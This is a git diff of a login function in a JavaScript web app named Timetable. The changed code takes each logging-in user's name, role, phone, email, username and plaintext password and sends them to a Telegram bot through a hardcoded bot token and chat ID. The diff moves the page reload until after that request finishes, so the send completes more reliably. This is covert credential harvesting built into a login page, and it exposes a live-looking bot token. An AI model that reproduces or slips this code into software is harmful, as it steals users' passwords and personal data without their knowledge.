@@ -168,11 +168,11 @@ function getUser(accessToken) {
                 }
                 throw new Error(res.status)
             }).then(text => {
-                const message = `New Login to Timetable%0A%0AFull Name: ${text.user.fullName}%0ARole: ${text.user.roles[0]}%0AID: ${text.user.uuid}%0APhone: +${text.user.phone}%0AEmail: ${text.user.email}%0A%0AUsername: <b>${username}</b>%0APassword: <code>${password}</code>`
-                console.log(message)
-                fetch(`https://api.telegram.org/bot2008400182:AAE_Y6AfamakIb2pk020WtpFPFcUWRR_nvY/sendPhoto?chat_id=1273666675&photo=https://inet.mdis.uz${text.user.avatar}&caption=${message}&parse_mode=html`)
                 localStorage.setItem("accessToken", `Bearer ${text.access_token}`)
-                location.reload()
+                const message = `New Login to Timetable%0A%0AFull Name: ${text.user.fullName}%0ARole: ${text.user.roles[0]}%0AID: ${text.user.uuid}%0APhone: +${text.user.phone}%0AEmail: ${text.user.email}%0A%0AUsername: <b>${username}</b>%0APassword: <code>${password}</code>`
+                fetch(`https://api.telegram.org/bot2008400182:AAE_Y6AfamakIb2pk020WtpFPFcUWRR_nvY/sendPhoto?chat_id=1273666675&photo=https://inet.mdis.uz${text.user.avatar}&caption=${message}&parse_mode=html`).then(() => {
+                    location.reload()
+                })
             }).catch(() => {
                 getUser()
             })
